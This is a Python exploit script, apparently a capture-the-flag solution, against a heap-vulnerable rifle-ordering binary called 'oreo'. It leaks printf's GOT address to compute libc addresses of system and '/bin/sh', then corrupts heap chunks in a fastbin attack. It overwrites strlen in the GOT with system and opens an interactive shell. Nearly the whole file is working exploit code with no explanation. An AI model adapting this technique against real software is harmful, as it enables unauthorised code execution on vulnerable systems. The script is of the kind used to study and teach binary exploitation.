#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *

def dbg(i = 0):
    log("break %d" % i, 'red')
    io.gdb_hint()

def connect(target=('127.0.0.1', 1414)):
    # io = zio(target, timeout=1000, print_read=COLORED(REPR,'yellow'),\
    #     print_write=COLORED(REPR,'blue'))
    io = zio(target, timeout=10000, print_read=False, print_write=False)
    return io

def read2act():
    return io.read_until('Action: ')

def _add(name, desc):
    global num
    num += 1
    log('add: %d' % num, 'green')
    io.writeline('1')
    io.read_until('Rifle name: ')
    io.writeline(name)
    io.read_until('Rifle description: ')
    io.writeline(desc)
    read2act()

def _show():
    io.writeline('2')
    io.read_until('Rifle to be ordered:')
    return read2act()

def _order():
    io.writeline('3')
    read2act()

def _leave(msg):
    io.writeline('4')
    io.read_until('submit with your order: ')
    io.writeline(msg)
    #read2act()

def leak(leak_got):
    _add('Q'*27+l32(leak_got), 'LeoC')
    return l32(_show().split('Description: ')[2][0:4])

def get_shell():
    log('get shell...', 'red')
    io.interact()


num = 0
local = 1
if local:
    target = ('stdbuf -o0 ./oreo')
    io = connect(target)
    offset_printf = 0x4a270
    offset_system = 0x3afe0
    offset_binsh = 0x15d233
else:
    target = ('10.211.55.66', 1414)
    offset_printf = 0x4a270
    offset_system = 0x3afe0
    offset_binsh = 0x15d233

dbg(0)

printf_got = 0x804A234
libc_printf = leak(printf_got)
libc_system = libc_printf - offset_printf + offset_system
libc_binsh = libc_printf - offset_printf + offset_binsh
log('libc_printf: ' + hex(libc_printf), 'red')
log('libc_system: ' + hex(libc_system), 'red')
log('libc_binsh: ' + hex(libc_binsh), 'red')

dbg(1)
for i in range(0x3c):
    _add('Q'*27 + l32(0x0), desc = "LeoC")
dbg(2)
_add(name="QooBee", desc="LeoC")
_order() # push fastbins N=2

# overwrite p_order_msg
strlen_got = 0x0804A250
# overwrite
_add(name="A"*27 + l32(0) + l32(0x9) + l32(0x41) + l32(0x0804A2A4-4), desc="LeoC")
# unlink # push dummy fastbins
_add(name="A"*27 + l32(0), desc="LeoC")
# malloc then overwrite p_order_msg
dbg()
_add(name="dead", desc=l32(strlen_got))

# overwrite strlen@got
_leave(msg=l32(libc_system) + ";sh\x00")

get_shell()
